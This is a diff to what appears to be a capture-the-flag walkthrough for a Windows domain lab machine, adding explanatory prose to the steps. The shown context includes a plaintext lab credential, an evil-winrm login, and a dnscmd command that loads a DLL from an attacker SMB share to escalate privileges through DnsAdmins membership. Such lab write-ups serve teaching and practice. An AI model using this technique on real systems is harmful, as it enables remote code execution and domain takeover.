@@ -531,6 +531,7 @@ It looks like user `ryan` is trying to execute a command and plain text password
 ryan:Serv3r4Admin4cc123!
 ```
 
+This time again, we can use `evil-winrm` to login to the server.
 ```shell
 root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'
 
@@ -542,7 +543,7 @@ Info: Establishing connection to remote endpoint
 megabank\ryan
 ```
 
-
+Then, check the permission for user `ryan`. We can find that this user is in the group `DnsAdmins`.
 ```shell
 *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups
 
@@ -563,7 +564,6 @@ MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 ```
-
 
 According to [this article](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83), giving DnsAdmin permission for general user can be abused.<br>
 First, we need to create a payload for that.
@@ -591,7 +591,8 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 ```
 
-memo
+[dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) has an option to load an external dll file.<br>
+We can take advantage of that.
 ```shell
 *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.22\share\exploit.dll
 
